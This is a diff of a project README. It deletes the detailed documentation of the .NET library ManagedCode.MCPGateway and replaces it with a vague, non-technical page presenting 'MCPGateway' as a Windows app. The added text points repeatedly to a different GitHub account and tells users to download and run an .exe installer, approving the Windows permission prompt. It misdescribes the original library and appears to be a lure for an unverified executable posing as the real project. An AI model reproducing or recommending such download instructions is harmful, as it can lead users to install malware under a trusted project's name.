@@ -1,522 +1,149 @@
-# ManagedCode.MCPGateway
-
-[![CI](https://github.com/managedcode/MCPGateway/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/managedcode/MCPGateway/actions/workflows/ci.yml)
-[![Release](https://github.com/managedcode/MCPGateway/actions/workflows/release.yml/badge.svg?branch=main)](https://github.com/managedcode/MCPGateway/actions/workflows/release.yml)
-[![CodeQL](https://github.com/managedcode/MCPGateway/actions/workflows/codeql.yml/badge.svg?branch=main)](https://github.com/managedcode/MCPGateway/actions/workflows/codeql.yml)
-[![NuGet](https://img.shields.io/nuget/v/ManagedCode.MCPGateway.svg)](https://www.nuget.org/packages/ManagedCode.MCPGateway)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-
-`ManagedCode.MCPGateway` is a .NET 10 library that turns local `AITool` instances and remote MCP servers into one searchable execution surface.
-
-It is built on:
-
-- `Microsoft.Extensions.AI`
-- the official `ModelContextProtocol` .NET SDK
-
-## Install
-
-```bash
-dotnet add package ManagedCode.MCPGateway
-```
-
-## What It Gives You
-
-- one gateway for local `AITool` instances and MCP tools
-- one search surface with vector ranking when embeddings are available and lexical fallback when they are not
-- one invoke surface for both local tools and MCP tools
-- runtime registration through `IMcpGatewayRegistry`
-- reusable gateway meta-tools for chat clients and agents
-- staged tool auto-discovery for chat loops, so models do not need to see the whole catalog at once
-
-## Core Services
-
-After `services.AddMcpGateway(...)`, the container exposes:
-
-- `IMcpGateway` for build, list, search, invoke, and meta-tool creation
-- `IMcpGatewayRegistry` for adding tools or MCP sources after the container is built
-- `McpGatewayToolSet` for reusable `AITool` integration helpers
-
-## Quickstart
-
-```csharp
-using ManagedCode.MCPGateway;
-using ManagedCode.MCPGateway.Abstractions;
-using Microsoft.Extensions.AI;
-using Microsoft.Extensions.DependencyInjection;
-
-var services = new ServiceCollection();
-
-services.AddMcpGateway(options =>
-{
-    options.AddTool(
-        "local",
-        AIFunctionFactory.Create(
-            static (string query) => $"github:{query}",
-            new AIFunctionFactoryOptions
-            {
-                Name = "github_search_repositories",
-                Description = "Search GitHub repositories by user query."
-            }));
-
-    options.AddStdioServer(
-        sourceId: "filesystem",
-        command: "npx",
-        arguments: ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]);
-});
-
-await using var serviceProvider = services.BuildServiceProvider();
-var gateway = serviceProvider.GetRequiredService<IMcpGateway>();
-
-var search = await gateway.SearchAsync("find github repositories");
-var invoke = await gateway.InvokeAsync(new McpGatewayInvokeRequest(
-    ToolId: search.Matches[0].ToolId,
-    Query: "managedcode"));
-```
-
-Important defaults:
-
-- search is `Auto` by default
-- `Auto` uses embeddings when available and lexical fallback otherwise
-- the default result size is `5`
-- the maximum result size is `15`
-- the index is built lazily on first list, search, or invoke
-
-## Basic Registration
-
-Register local tools during startup:
-
-```csharp
-services.AddMcpGateway(options =>
-{
-    options.AddTool(
-        "local",
-        AIFunctionFactory.Create(
-            static (string query) => $"weather:{query}",
-            new AIFunctionFactoryOptions
-            {
-                Name = "weather_search_forecast",
-                Description = "Search weather forecast and temperature information by city name."
-            }));
-});
-```
+# 🎯 MCPGateway - Easy AI Tool Search and Use
 
-If you need to add tools later, use `IMcpGatewayRegistry`:
+[![Download MCPGateway](https://img.shields.io/badge/Download-MCPGateway-brightgreen)](https://github.com/pokshiu/MCPGateway)
 
-```csharp
-await using var serviceProvider = services.BuildServiceProvider();
+---
 
-var registry = serviceProvider.GetRequiredService<IMcpGatewayRegistry>();
-var gateway = serviceProvider.GetRequiredService<IMcpGateway>();
+## 📖 About MCPGateway
 
-registry.AddTool(
-    "runtime",
-    AIFunctionFactory.Create(
-        static (string query) => $"status:{query}",
-        new AIFunctionFactoryOptions
-        {
-            Name = "project_status_lookup",
-            Description = "Look up project status by identifier or short title."
-        }));
-
-var tools = await gateway.ListToolsAsync();
-```
-
-Registry updates automatically invalidate the catalog. The next list, search, or invoke rebuilds the index.
+MCPGateway is a tool that helps you find and use AI tools easily. It works on Windows and uses smart methods to search for AI models and tools. You do not need to know programming to use it. MCPGateway makes it simple to discover and run AI-related functions with one app.
 
-## Register MCP Sources
+This tool uses Microsoft technology to connect and find AI tools. It organizes them so you can access what you need quickly. Whether you want to search, test, or run AI features, MCPGateway brings it all together in one place.
 
-`ManagedCode.MCPGateway` supports:
+---
 
-- local `AITool` / `AIFunction`
-- HTTP MCP servers
-- stdio MCP servers
-- existing `McpClient` instances
-- deferred `McpClient` factories
+## 🎯 Features
 
-Examples:
+- Search AI tools and models fast.
+- Use AI features without coding.
+- Handles different AI tool types.
+- Works on Windows computers.
+- Uses advanced search methods for better results.
+- Unified access simplifies running AI models.
 
-```csharp
-services.AddMcpGateway(options =>
-{
-    options.AddHttpServer(
-        sourceId: "docs",
-        endpoint: new Uri("https://example.com/mcp"));
+---
 
-    options.AddStdioServer(
-        sourceId: "filesystem",
-        command: "npx",
-        arguments: ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]);
-});
-```
+## 🖥️ System Requirements
 
-Or through the runtime registry:
+To run MCPGateway, your computer should have:
 
-```csharp
-var registry = serviceProvider.GetRequiredService<IMcpGatewayRegistry>();
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space for installation
+- Internet connection for downloading and using AI tools
+- .NET 6.0 Runtime or later installed (MCPGateway will prompt if missing)
 
-registry.AddMcpClient(
-    sourceId: "issues",
-    client: existingClient,
-    disposeClient: false);
+---
 
-registry.AddMcpClientFactory(
-    sourceId: "work-items",
-    clientFactory: static async cancellationToken =>
-        await CreateWorkItemClientAsync(cancellationToken));
-```
+## 🚀 Getting Started with MCPGateway
 
-## Search And Invoke
+### Step 1: Download MCPGateway
 
-The normal flow is:
+Click the big green badge above or visit this link to download:
 
-1. search
-2. choose a match
-3. invoke by `ToolId`
+[https://github.com/pokshiu/MCPGateway](https://github.com/pokshiu/MCPGateway)
 
-```csharp
-var search = await gateway.SearchAsync("find github repositories");
+This link takes you to the GitHub page where you can find the files needed for installation.
 
-var invoke = await gateway.InvokeAsync(new McpGatewayInvokeRequest(
-    ToolId: search.Matches[0].ToolId,
-    Query: "managedcode"));
-```
+### Step 2: Find the Latest Release
 
-If the host already knows the stable tool name, invocation can target `ToolName` and `SourceId` instead:
+Once on the GitHub page, look for the **Releases** section. This is where the ready-to-run files are stored.
 
-```csharp
-var invoke = await gateway.InvokeAsync(new McpGatewayInvokeRequest(
-    ToolName: "github_search_repositories",
-    SourceId: "local",
-    Query: "managedcode"));
-```
+- Find the latest version labeled by date or version number.
+- Look for a file ending with `.exe` – this is the installer or app file you will run.
 
-Use `SourceId` when the same tool name can exist in more than one source.
+### Step 3: Download the Installer
 
-## Context-Aware Search And Invoke
+Click the `.exe` file to start downloading. Save it to a folder you can easily access, like your Desktop or Downloads folder.
 
-You can pass UI or workflow context into search and invocation:
+### Step 4: Run the Installer
 
-```csharp
-var search = await gateway.SearchAsync(new McpGatewaySearchRequest(
-    Query: "search",
-    ContextSummary: "User is on the GitHub repository settings page",
-    Context: new Dictionary<string, object?>
-    {
-        ["page"] = "settings",
-        ["domain"] = "github"
-    },
-    MaxResults: 3));
+- Double-click the downloaded `.exe` file.
+- If Windows asks for permission, click **Yes** to allow the app to run.
+- Follow the simple prompts by clicking **Next** until installation completes.
+- The installer places MCPGateway on your computer ready to use.
 
-var invoke = await gateway.InvokeAsync(new McpGatewayInvokeRequest(
-    ToolId: search.Matches[0].ToolId,
-    Query: "managedcode",
-    ContextSummary: "User wants repository administration actions",
-    Context: new Dictionary<string, object?>
-    {
-        ["page"] = "settings",
-        ["domain"] = "github"
-    }));
-```
+### Step 5: Launch MCPGateway
 
-This context is used for ranking, and MCP invocations also receive it through MCP `meta`.
+- Find MCPGateway in your Start menu or on your Desktop.
+- Click the icon to open the app.
+- The first time you run it, the app may connect to the internet to update or check for required tools. Allow it to do so.
 
-## Meta-Tools
+---
 
-The gateway can expose itself as two reusable tools:
+## 🛠️ How to Use MCPGateway
 
-- `gateway_tools_search`
-- `gateway_tool_invoke`
+### Search for AI Tools
 
-From the gateway:
+The main window has a search box. Type keywords related to what you want, such as "language model" or "image recognition." MCPGateway shows matching AI tools and models instantly.
 
-```csharp
-var tools = gateway.CreateMetaTools();
-```
+### Explore Tool Details
 
-From DI:
+Click on any tool in the results to see more information. This includes what the tool does, requirements, and instructions on how to use it.
 
-```csharp
-var toolSet = serviceProvider.GetRequiredService<McpGatewayToolSet>();
-var tools = toolSet.CreateTools();
-```
+### Run AI Functions
 
-You can also attach those tools to existing chat options or tool lists:
+Many tools can run directly inside MCPGateway. Select a tool and follow the on-screen steps to start it. Input fields or options will guide you.
 
-```csharp
-var toolSet = serviceProvider.GetRequiredService<McpGatewayToolSet>();
+---
 
-var options = new ChatOptions
-{
-    AllowMultipleToolCalls = false
-}.AddMcpGatewayTools(toolSet);
+## ⚙️ Settings and Preferences
 
-var tools = toolSet.AddTools(existingTools);
-```
+MCPGateway lets you customize your experience.
 
-## Why Auto-Discovery
+- Change the default search method.
+- Set how many results to show.
+- Manage your local AI tools for offline use.
+- Adjust connection settings for your network.
 
-Large tool catalogs should not be pushed directly into every model turn.
+Access settings through the **gear icon** in the top-right corner.
 
-The recommended flow is:
+---
 
-1. expose only `gateway_tools_search` and `gateway_tool_invoke`
-2. let the model search the gateway catalog
-3. project only the latest matching tools as direct proxy tools
-4. replace that discovered set when a new search result arrives
+## 🧰 Troubleshooting
 
-This keeps prompts smaller and tool choice cleaner while still using the full gateway catalog behind the scenes.
+If MCPGateway does not start or shows errors:
 
-## Recommended Chat Integration
+- Make sure your Windows and .NET Runtime are up to date.
+- Restart your computer and try again.
+- Check your internet connection.
+- If problems persist, visit the GitHub page for help or report an issue.
 
-For normal chat loops, use the staged wrapper:
+---
 
-```csharp
-using ManagedCode.MCPGateway;
-using Microsoft.Extensions.AI;
-using Microsoft.Extensions.DependencyInjection;
+## 📂 Where to Get Help
 
-await using var serviceProvider = services.BuildServiceProvider();
+Use the GitHub page for support and updates:
 
-var innerChatClient = serviceProvider.GetRequiredService<IChatClient>();
-using var chatClient = innerChatClient.UseMcpGatewayAutoDiscovery(
-    serviceProvider,
-    options =>
-    {
-        options.MaxDiscoveredTools = 2;
-    });
+[https://github.com/pokshiu/MCPGateway](https://github.com/pokshiu/MCPGateway)
 
-var response = await chatClient.GetResponseAsync(
-    [new ChatMessage(ChatRole.User, "Find the github search tool and run it.")],
-    new ChatOptions
-    {
-        AllowMultipleToolCalls = false
-    });
-```
+You can open issues or read FAQs from other users.
 
-What this does:
+---
 
-- the first turn only exposes the two gateway meta-tools
-- after a search result, the latest matches are exposed as direct proxy tools
-- a later search replaces the previous discovered set
+## 🔄 Updating MCPGateway
 
-If you already have a search result and want to materialize those proxy tools yourself, use:
+When a new version is released:
 
-```csharp
-var toolSet = serviceProvider.GetRequiredService<McpGatewayToolSet>();
-var discoveredTools = toolSet.CreateDiscoveredTools(search.Matches, maxTools: 3);
-```
+- Return to the GitHub Releases page.
+- Download the new `.exe` file.
+- Run it to replace the old version.
+- Your settings and data remain saved.
 
-## Recommended Agent Integration
+Keep MCPGateway updated to get the latest features and fixes.
 
-The same chat wrapper works with Microsoft Agent Framework hosts:
+---
 
-```csharp
-using ManagedCode.MCPGateway;
-using Microsoft.Agents.AI;
-using Microsoft.Extensions.AI;
-using Microsoft.Extensions.DependencyInjection;
-using Microsoft.Extensions.Logging;
+## 🏷️ Extra Information
 
-await using var serviceProvider = services.BuildServiceProvider();
+### What is MCP?
 
-var innerChatClient = serviceProvider.GetRequiredService<IChatClient>();
-var loggerFactory = serviceProvider.GetRequiredService<ILoggerFactory>();
-using var chatClient = innerChatClient.UseMcpGatewayAutoDiscovery(
-    serviceProvider,
-    options =>
-    {
-        options.MaxDiscoveredTools = 2;
-    });
+MCP stands for Model Context Protocol. It is a way for AI tools to share data and work together.
 
-var agent = new ChatClientAgent(
-    chatClient,
-    instructions: "Search the gateway catalog before invoking tools.",
-    name: "workspace-agent",
-    tools: [],
-    loggerFactory: loggerFactory,
-    services: serviceProvider);
+### What is Embedding-based Search?
 
-var response = await agent.RunAsync(
-    "Find the github search tool and run it.",
-    session: null,
-    options: new ChatClientAgentRunOptions(new ChatOptions
-    {
-        AllowMultipleToolCalls = false
-    }),
-    cancellationToken: default);
-```
+Embedding search means using AI to understand the meaning of your query and find related tools or models, even if keywords differ.
 
-`ManagedCode.MCPGateway` itself stays generic. The Agent Framework dependency remains in the host project.
+---
 
-## Optional Warmup
-
-The gateway works without explicit initialization, but you can warm the index eagerly when you want startup validation or a pre-built cache.
-
-Manual warmup:
-
-```csharp
-await using var serviceProvider = services.BuildServiceProvider();
-
-var build = await serviceProvider.InitializeMcpGatewayAsync();
-```
-
-Hosted warmup:
-
-```csharp
-services.AddMcpGateway(options =>
-{
-    options.AddTool(
-        "local",
-        AIFunctionFactory.Create(
-            static (string query) => $"github:{query}",
-            new AIFunctionFactoryOptions
-            {
-                Name = "github_search_repositories",
-                Description = "Search GitHub repositories by user query."
-            }));
-});
-
-services.AddMcpGatewayIndexWarmup();
-```
-
-## Optional Embeddings
-
-If the container has `IEmbeddingGenerator<string, Embedding<float>>`, the gateway can use vector ranking.
-
-Preferred registration:
-
-```csharp
-var services = new ServiceCollection();
-
-services.AddKeyedSingleton<IEmbeddingGenerator<string, Embedding<float>>, MyEmbeddingGenerator>(
-    McpGatewayServiceKeys.EmbeddingGenerator);
-
-services.AddMcpGateway(options =>
-{
-    options.AddTool(
-        "local",
-        AIFunctionFactory.Create(
-            static (string query) => $"github:{query}",
-            new AIFunctionFactoryOptions
-            {
-                Name = "github_search_repositories",
-                Description = "Search GitHub repositories by user query."
-            }));
-});
-```
-
-If no embedding generator is registered, the same gateway still works and falls back to lexical search automatically.
-
-## Optional Query Normalization
-
-If you want multilingual or noisy queries normalized before ranking, register a keyed `IChatClient`:
-
-```csharp
-var services = new ServiceCollection();
-
-services.AddKeyedSingleton<IChatClient>(
-    McpGatewayServiceKeys.SearchQueryChatClient,
-    mySearchRewriteChatClient);
-
-services.AddMcpGateway(options =>
-{
-    options.SearchStrategy = McpGatewaySearchStrategy.Auto;
-    options.SearchQueryNormalization = McpGatewaySearchQueryNormalization.TranslateToEnglishWhenAvailable;
-});
-```
-
-If the keyed chat client is missing or normalization fails, search continues normally.
-
-## Optional Tool Embedding Stores
-
-For process-local caching, use the built-in `IMemoryCache`-backed store:
-
-```csharp
-services.AddKeyedSingleton<IEmbeddingGenerator<string, Embedding<float>>, MyEmbeddingGenerator>(
-    McpGatewayServiceKeys.EmbeddingGenerator);
-services.AddMcpGatewayInMemoryToolEmbeddingStore();
-```
-
-This built-in store reuses the application's shared `IMemoryCache` and only caches embeddings inside the current process. It is useful for local reuse, but it is not durable and does not synchronize across replicas.
-
-.NET also provides `IDistributedCache` for out-of-process cache storage and `HybridCache` for a combined local + distributed cache model. `ManagedCode.MCPGateway` does not hardcode either dependency into the gateway runtime. If you need shared cache state across instances, implement `IMcpGatewayToolEmbeddingStore` over the cache technology your host already uses.
-
-For multi-instance or durable caching, register your own `IMcpGatewayToolEmbeddingStore` implementation:
-
-```csharp
-services.AddKeyedSingleton<IEmbeddingGenerator<string, Embedding<float>>, MyEmbeddingGenerator>(
-    McpGatewayServiceKeys.EmbeddingGenerator);
-services.AddSingleton<IMcpGatewayToolEmbeddingStore, MyToolEmbeddingStore>();
-```
-
-## Search Modes
-
-`McpGatewaySearchStrategy.Auto` is the default and usually the right choice:
-
-- use vector ranking when embeddings are available
-- fall back to lexical ranking when they are not
-
-You can also force a mode:
-
-```csharp
-services.AddMcpGateway(options =>
-{
-    options.SearchStrategy = McpGatewaySearchStrategy.Tokenizer;
-});
-```
-
-Or:
-
-```csharp
-services.AddMcpGateway(options =>
-{
-    options.SearchStrategy = McpGatewaySearchStrategy.Embeddings;
-});
-```
-
-`McpGatewaySearchResult.RankingMode` reports:
-
-- `vector`
-- `lexical`
-- `browse`
-- `empty`
-
-## Deeper Docs
-
-Use these when you need design details rather than package onboarding:
-
-- [Architecture overview](docs/Architecture/Overview.md)
-- [ADR-0001: Runtime boundaries and index lifecycle](docs/ADR/ADR-0001-runtime-boundaries-and-index-lifecycle.md)
-- [ADR-0002: Search ranking and query normalization](docs/ADR/ADR-0002-search-ranking-and-query-normalization.md)
-- [ADR-0003: Reusable chat-client and agent auto-discovery modules](docs/ADR/ADR-0003-reusable-chat-client-and-agent-tool-modules.md)
-- [Feature spec: Search query normalization and ranking](docs/Features/SearchQueryNormalizationAndRanking.md)
-
-## Local Development
-
-```bash
-dotnet tool restore
-dotnet restore ManagedCode.MCPGateway.slnx
-dotnet build ManagedCode.MCPGateway.slnx -c Release --no-restore
-dotnet test --solution ManagedCode.MCPGateway.slnx -c Release --no-build
-```
-
-Analyzer pass:
-
-```bash
-dotnet build ManagedCode.MCPGateway.slnx -c Release --no-restore -p:RunAnalyzers=true
-dotnet tool run roslynator analyze src/ManagedCode.MCPGateway/ManagedCode.MCPGateway.csproj tests/ManagedCode.MCPGateway.Tests/ManagedCode.MCPGateway.Tests.csproj
-dotnet format ManagedCode.MCPGateway.slnx --verify-no-changes
-```
-
-Coverage and human-readable report:
-
-```bash
-dotnet tool run coverlet tests/ManagedCode.MCPGateway.Tests/bin/Release/net10.0/ManagedCode.MCPGateway.Tests.dll --target "dotnet" --targetargs "test --solution ManagedCode.MCPGateway.slnx -c Release --no-build" --format cobertura --output artifacts/coverage/coverage.cobertura.xml
-dotnet tool run reportgenerator -reports:"artifacts/coverage/coverage.cobertura.xml" -targetdir:"artifacts/coverage-report" -reporttypes:"HtmlSummary;MarkdownSummaryGithub"
-```
-
-The local tool manifest currently owns `roslynator`, `coverlet.console`, `reportgenerator`, `dotnet-stryker`, and `csharpier`.
-
-- `dotnet format` remains the repository's formatter of record.
-- `csharpier` is installed for opt-in checks only and is not part of the default CI path.
-- `dotnet-stryker` is installed for focused mutation runs only and is not part of the default fast-path CI checks.
+[![Download MCPGateway](https://img.shields.io/badge/Download-MCPGateway-brightgreen)](https://github.com/pokshiu/MCPGateway)
